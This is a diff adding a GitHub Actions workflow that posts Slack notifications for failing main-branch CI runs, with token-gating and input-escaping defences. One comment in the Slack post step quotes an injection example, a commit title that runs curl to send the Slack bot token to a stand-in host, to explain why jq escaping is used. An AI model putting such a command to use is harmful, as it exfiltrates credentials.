@@ -1,0 +1,365 @@
+name: Notify Slack on main-branch workflow failure
+
+# Fires when a watched operational workflow completes with a failing
+# conclusion for the default branch (or an allowlisted release tag). Posts a
+# structured message to `#ci-failures` via Slack's `chat.postMessage`, so
+# silent post-merge breakage is caught without anyone watching the Actions tab.
+#
+# Relationship to `.github/workflows/ci-failure-notifier.yml`: that workflow
+# owns the managed GitHub issue lifecycle (open, update, close after recovery)
+# and remains the durable record. This workflow only pushes a notification and
+# duplicates none of that logic — it links to the run and to the managed issue
+# search. Both watch the same static workflow allowlist; `pnpm
+# quality:budgets:test` asserts the two lists stay identical.
+#
+# The bot token is the org-shared `secrets.SLACK_BOT_TOKEN`. It needs Slack's
+# `chat:write.public` scope so the bot can post to a public channel it has not
+# been invited to.
+#
+# Trigger discipline:
+#   - `workflow_run` requires the watched workflows to be named explicitly
+#     here; `workflow_run.workflows` does NOT support wildcards. Keep this list
+#     byte-identical to the `ci-failure-notifier.yml` allowlist.
+#   - The `if:` gate mirrors the issue notifier's admission rules and then
+#     narrows to failing conclusions: default-branch `push`, `schedule`, and
+#     `workflow_dispatch` runs, the allowlisted release-tag `push` workflow,
+#     and the repository-owned `Vercel Main Deployment` `workflow_run`.
+#   - `workflow_dispatch` (no inputs — checkov CKV_GHA_7 forbids them) lets you
+#     smoke-test the wiring by posting a fixed "🧪 wiring test" message. The
+#     workflow must be on `main` to be dispatchable at all, so the smoke test
+#     can only be run after this file has merged.
+#
+# Token exposure and the branch-selected dispatch:
+#   `gh workflow run --ref <branch>` runs the workflow VERSION on that ref, so
+#   a collaborator with push access could otherwise dispatch an edited copy and
+#   read `SLACK_BOT_TOKEN`. Two layers narrow that:
+#     1. The job's `if:` requires `github.ref` to be the default branch for
+#        EVERY event, so a branch dispatch skips before a step can read the
+#        secret. For `workflow_run` GitHub always sets the ref to the default
+#        branch, so real notifications are unaffected.
+#     2. The job runs in the `slack-ci-notifications` GitHub Environment, whose
+#        deployment branch policy allows `main` only. GitHub enforces that
+#        server-side, before the job starts — the same shape
+#        `vercel-main-deployment.yml` uses with `vercel-cli-production`.
+#   Neither layer is complete while `SLACK_BOT_TOKEN` is an org-shared secret:
+#   an attacker editing this file on their own branch can delete both. The
+#   control only becomes airtight once the token is an ENVIRONMENT secret on
+#   `slack-ci-notifications` and the org-level copy is removed, at which point
+#   a copy without the `environment:` key resolves an empty token. Note that
+#   push access already grants every repo and org secret through an ordinary
+#   `on: push` workflow, so this is a hardening step, not a new exposure.
+#
+# This workflow never checks out or executes the triggering head SHA. It reads
+# `workflow_run` metadata into env and posts to Slack.
+on:
+  workflow_run:
+    workflows:
+      - CI/CD
+      - E2E (Connected Wallet)
+      - Publish UI Package
+      - Quality Budgets
+      - Scorecard supply-chain security
+      - Supply Chain
+      - Vercel Main Deployment
+      - Visual Regression
+    types: [completed]
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  notify:
+    name: post failure to Slack
+    # The first clause runs for EVERY event: only the default-branch copy of
+    # this workflow may reach the Slack token. See "Token exposure" above.
+    # Test-fire path: `workflow_dispatch` always posts (no failure gate).
+    # Real path: post only for a watched workflow's admitted failing run.
+    # The conclusion list is exactly `FAILURE_CONCLUSIONS` from
+    # `scripts/ci-failure-issue.mjs`, so Slack covers the same incident set the
+    # managed issue does:
+    #   - failure          -> a step exited non-zero
+    #   - timed_out        -> the runner exceeded the job timeout
+    #   - startup_failure  -> the runner could not start the job
+    #   - action_required  -> the run stalled waiting on manual approval
+    # Skip `cancelled` (usually a manual operator action) and `success`,
+    # `neutral`, and `skipped` (not failures).
+    if: >-
+      github.ref == format('refs/heads/{0}', github.event.repository.default_branch) &&
+      (
+        github.event_name == 'workflow_dispatch' ||
+        (
+          contains(fromJSON('["action_required", "failure", "startup_failure", "timed_out"]'), github.event.workflow_run.conclusion) &&
+          (
+            github.event.workflow_run.event == 'schedule' ||
+            (
+              github.event.workflow_run.event == 'push' &&
+              (
+                github.event.workflow_run.head_branch == github.event.repository.default_branch ||
+                github.event.workflow_run.name == 'Publish UI Package'
+              )
+            ) ||
+            (
+              github.event.workflow_run.event == 'workflow_dispatch' &&
+              github.event.workflow_run.head_branch == github.event.repository.default_branch
+            ) ||
+            (
+              github.event.workflow_run.event == 'workflow_run' &&
+              github.event.workflow_run.name == 'Vercel Main Deployment' &&
+              github.event.workflow_run.head_branch == github.event.repository.default_branch &&
+              github.event.workflow_run.head_repository.full_name == github.repository
+            )
+          )
+        )
+      )
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    # `actions: read` is the single scope the freshness reconciliation below
+    # needs to list this workflow's completed runs. Nothing else is granted:
+    # the Slack credential goes to Slack, and this job writes nothing back to
+    # GitHub.
+    permissions:
+      actions: read
+    # Server-side branch gate: the `slack-ci-notifications` environment allows
+    # `main` only, so GitHub blocks this job on any other ref before it starts.
+    # `deployment: false` keeps it out of the Deployments tab, matching
+    # `vercel-main-deployment.yml`'s use of `vercel-cli-production`.
+    environment:
+      name: slack-ci-notifications
+      deployment: false # trunk-ignore(actionlint/syntax-check): Pinned actionlint has not learned GitHub's deployment key.
+    steps:
+      # A `workflow_run` callback can arrive out of order: run N's failure can
+      # land after run N+1 already succeeded, and an older attempt can land
+      # after a successful rerun. `scripts/ci-failure-issue.mjs` handles that
+      # by reconciling every callback to the latest decisive run in its
+      # partition (`workflow_id` + `event` + target ref) and acting on THAT
+      # run, so it closes or leaves closed the managed issue. Slack is not
+      # idempotent the way one managed issue is, so the mirror here is:
+      # post only when the triggering run is itself the latest decisive run in
+      # its partition. A newer decisive run either succeeded — nothing to
+      # announce — or failed and owns its own message.
+      #
+      # Fails open: any API error, or a callback run missing from the page,
+      # posts anyway. A rare duplicate beats a dropped alert.
+      - name: Reconcile against the latest decisive run
+        id: freshness
+        if: github.event_name != 'workflow_dispatch'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          API_URL: ${{ github.api_url }}
+          REPOSITORY: ${{ github.repository }}
+          # All GitHub-controlled scalars. WORKFLOW_ID is additionally checked
+          # to be digits before it reaches the request URL.
+          WORKFLOW_ID: ${{ github.event.workflow_run.workflow_id }}
+          EVENT: ${{ github.event.workflow_run.event }}
+          RUN_NUMBER: ${{ github.event.workflow_run.run_number }}
+          RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt }}
+          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+        run: |
+          set -euo pipefail
+
+          if ! printf '%s' "$WORKFLOW_ID" | grep -Eq '^[0-9]+$'; then
+            echo "Unexpected workflow id; posting without reconciliation."
+            echo "stale=false" >>"$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          # Pages of 100 completed runs, newest first, filtered to this
+          # callback's own event — the same query `listCompletedWorkflowRuns()`
+          # issues. That helper keeps paginating until a page contains a run at
+          # or before the callback, because a long tail of newer non-decisive
+          # runs (100 cancellations, say) can push the decisive one past the
+          # first page. This loop stops on the same condition, and additionally
+          # as soon as a newer decisive run is found — the only fact it needs.
+          # PAGE_LIMIT bounds the job; exhausting it fails open.
+          STALE=false
+          PAGE=1
+          PAGE_LIMIT=10
+          while [ "$PAGE" -le "$PAGE_LIMIT" ]; do
+            if ! RUNS=$(curl -fsS \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -H "X-GitHub-Api-Version: 2022-11-28" \
+              --get \
+              --data-urlencode "event=$EVENT" \
+              --data-urlencode "status=completed" \
+              --data-urlencode "exclude_pull_requests=true" \
+              --data-urlencode "per_page=100" \
+              --data-urlencode "page=$PAGE" \
+              "$API_URL/repos/$REPOSITORY/actions/workflows/$WORKFLOW_ID/runs"); then
+              echo "Could not list workflow runs; posting without reconciliation."
+              echo "stale=false" >>"$GITHUB_OUTPUT"
+              exit 0
+            fi
+
+            # `isDecisiveRun()` is `success` plus FAILURE_CONCLUSIONS, and
+            # `compareRuns()` orders by run_number then run_attempt. The target
+            # ref uses the same fallback as `targetRefFor()`. Candidates must
+            # also be owned by this repository, mirroring the
+            # `head_repository.full_name` clause in `isRelevantRun()`: a fork
+            # PR whose head branch is named `main` produces a skipped-success
+            # `Vercel Main Deployment` run in this same partition, and without
+            # that filter the run would suppress a real failure's message. The
+            # query is already partitioned by event, and `push`, `schedule`,
+            # and `workflow_dispatch` runs are always repository-owned, so the
+            # filter only bites on `workflow_run`. A missing `head_repository`
+            # drops the candidate, which can only add a post, never drop one.
+            # `reached` mirrors
+            # the helper's break condition and deliberately spans every run on
+            # the page, not just this partition. Every value reaches jq through
+            # --arg or stdin; nothing is interpolated into the shell.
+            if ! RESULT=$(printf '%s' "$RUNS" | jq -r \
+              --arg event "$EVENT" \
+              --arg head_branch "$HEAD_BRANCH" \
+              --arg default_branch "$DEFAULT_BRANCH" \
+              --arg repository "$REPOSITORY" \
+              --argjson number "${RUN_NUMBER:-0}" \
+              --argjson attempt "${RUN_ATTEMPT:-1}" '
+                (if $head_branch != "" then $head_branch elif $event == "push" then "release tag" else $default_branch end) as $target
+                | ["success", "action_required", "failure", "startup_failure", "timed_out"] as $decisive
+                | (.workflow_runs // []) as $runs
+                | [ $runs[] | [(.run_number // 0), (.run_attempt // 1)] ] as $positions
+                | [ $runs[]
+                    | select(.status == "completed")
+                    | select(.conclusion as $c | $decisive | index($c))
+                    | select((if (.head_branch // "") != "" then .head_branch elif $event == "push" then "release tag" else $default_branch end) == $target)
+                    | select((.head_repository.full_name // "") == $repository)
+                    | [(.run_number // 0), (.run_attempt // 1)]
+                  ] as $decisivePositions
+                | [ ($decisivePositions | map(select(. > [$number, $attempt])) | length > 0),
+                    ($positions | map(select(. <= [$number, $attempt])) | length > 0),
+                    ($runs | length)
+                  ]
+                | @tsv
+              '); then
+              echo "Could not evaluate run freshness; posting without reconciliation."
+              echo "stale=false" >>"$GITHUB_OUTPUT"
+              exit 0
+            fi
+
+            IFS=$'\t' read -r PAGE_STALE PAGE_REACHED PAGE_COUNT <<<"$RESULT"
+            if [ "$PAGE_STALE" = "true" ]; then
+              STALE=true
+              break
+            fi
+            # Reached the callback, or ran out of runs: nothing newer remains.
+            if [ "$PAGE_REACHED" = "true" ] || [ "${PAGE_COUNT:-0}" -lt 100 ]; then
+              break
+            fi
+            PAGE=$((PAGE + 1))
+          done
+
+          if [ "$PAGE" -gt "$PAGE_LIMIT" ]; then
+            echo "Reached the $PAGE_LIMIT-page scan limit without finding this run; posting without reconciliation."
+            echo "stale=false" >>"$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          # Anything but a clean `true` posts. Fail open, always.
+          if [ "$STALE" != "true" ]; then
+            STALE=false
+          else
+            echo "A newer decisive run of this workflow already concluded; skipping the Slack post."
+          fi
+          echo "stale=$STALE" >>"$GITHUB_OUTPUT"
+
+      - name: Post to the ci-failures channel
+        if: steps.freshness.outputs.stale != 'true'
+        env:
+          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
+          IS_TEST: ${{ github.event_name == 'workflow_dispatch' }}
+          REPOSITORY: ${{ github.repository }}
+          # `workflow_run` context (only populated for real failures).
+          # IMPORTANT: never interpolate any of these into a shell command —
+          # a commit message can contain backticks or $(…) and would execute
+          # against the runner. Pass them to jq via --arg below, which escapes
+          # them safely.
+          WORKFLOW_NAME: ${{ github.event.workflow_run.name }}
+          RUN_URL: ${{ github.event.workflow_run.html_url }}
+          COMMIT_SHA: ${{ github.event.workflow_run.head_sha }}
+          COMMIT_MSG: ${{ github.event.workflow_run.display_title }}
+          ACTOR: ${{ github.event.workflow_run.triggering_actor.login }}
+          EVENT: ${{ github.event.workflow_run.event }}
+          CONCLUSION: ${{ github.event.workflow_run.conclusion }}
+          # GitHub omits head_branch for some scheduled runs and for tag
+          # pushes, which renders here as an empty string. The jq expression
+          # below applies the same event-aware fallback as `targetRefFor()` in
+          # scripts/ci-failure-issue.mjs, so both notifiers name the same ref.
+          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+        run: |
+          set -euo pipefail
+
+          # Build the whole Slack payload in one jq invocation. Every
+          # untrusted string (commit message, actor login, URL, ref) flows
+          # through --arg, so jq JSON-escapes it instead of the shell
+          # interpolating it. This closes a token-exfiltration vector: a
+          # commit titled `$(curl bad-site/?$SLACK_BOT_TOKEN)` would otherwise
+          # be executed by the shell before the API call.
+          #
+          # jq's string interpolation also handles newlines correctly — "\n"
+          # inside a jq string literal is a real newline, so Slack's mrkdwn
+          # renders multi-line blocks instead of literal "\n" text.
+          if [ "$IS_TEST" = "true" ]; then
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              --arg repo "$REPOSITORY" \
+              '{
+                channel: $ch,
+                text: "🧪 *Notify-Slack wiring test*",
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: "🧪 *Notify-Slack wiring test*"}},
+                  {type: "section", text: {type: "mrkdwn", text: ("If you can read this, the listener workflow in `" + $repo + "`, the #ci-failures channel, and the bot scopes are all wired correctly. Safe to ignore.")}}
+                ]
+              }')
+          else
+            # Escape the commit title for Slack mrkdwn before insertion. A
+            # merged commit titled `<!channel>` or `<@U123ABC>` would
+            # otherwise render as a real mass-page mention inside the message.
+            # Per Slack's mrkdwn escaping rules
+            # (https://api.slack.com/reference/surfaces/formatting#escaping)
+            # the three control characters are `&`, `<`, and `>` — escape `&`
+            # first or the later substitutions corrupt their own output. The
+            # workflow name, ref, and actor login are GitHub-managed and
+            # cannot contain mention syntax.
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              --arg repo "$REPOSITORY" \
+              --arg wf "$WORKFLOW_NAME" \
+              --arg url "$RUN_URL" \
+              --arg sha "${COMMIT_SHA:0:7}" \
+              --arg msg "$COMMIT_MSG" \
+              --arg actor "$ACTOR" \
+              --arg event "$EVENT" \
+              --arg conclusion "$CONCLUSION" \
+              --arg head_branch "$HEAD_BRANCH" \
+              --arg default_branch "$DEFAULT_BRANCH" \
+              '($msg | gsub("&"; "&amp;") | gsub("<"; "&lt;") | gsub(">"; "&gt;")) as $safe_msg
+               | (if $head_branch != "" then $head_branch elif $event == "push" then "release tag" else $default_branch end) as $ref
+               | (if $actor != "" and $actor != "null" then "\n*Triggered by:* " + $actor + " (`" + $event + "`)" else "\n*Triggered by:* `" + $event + "`" end) as $actor_line
+               | ("https://github.com/" + $repo + "/issues?q=" + ("is:issue is:open in:title CI: " + $wf + " is failing" | @uri)) as $issue_url
+               | {
+                channel: $ch,
+                text: ("❌ " + $wf + " " + $conclusion + " on " + $ref + " (" + $sha + ")"),
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: ("❌ *<" + $url + "|" + $wf + ">* concluded `" + $conclusion + "` on `" + $ref + "`")}},
+                  {type: "section", text: {type: "mrkdwn", text: ("*Commit:* `" + $sha + "` — " + $safe_msg + $actor_line + "\n\n<" + $url + "|View failed run →>  ·  <" + $issue_url + "|Managed failure issue →>")}},
+                  {type: "context", elements: [{type: "mrkdwn", text: "The CI Failure Notifier tracks this in a managed GitHub issue and closes it after recovery."}]}
+                ]
+              }')
+          fi
+
+          RESPONSE=$(curl -fsS -X POST https://slack.com/api/chat.postMessage \
+            -H "Authorization: Bearer $SLACK_BOT_TOKEN" \
+            -H "Content-Type: application/json; charset=utf-8" \
+            --data "$PAYLOAD")
+
+          # Slack answers 200 OK with {"ok": false, "error": "..."} on logical
+          # errors. Fail loudly when ok is not true, so this notifier does not
+          # go silently broken, which would defeat its purpose.
+          if [ "$(echo "$RESPONSE" | jq -r '.ok')" != "true" ]; then
+            echo "::error::Slack post failed: $(echo "$RESPONSE" | jq -r '.error // "unknown"')"
+            echo "Full response: $RESPONSE"
+            exit 1
+          fi
+          echo "Posted to #ci-failures successfully."
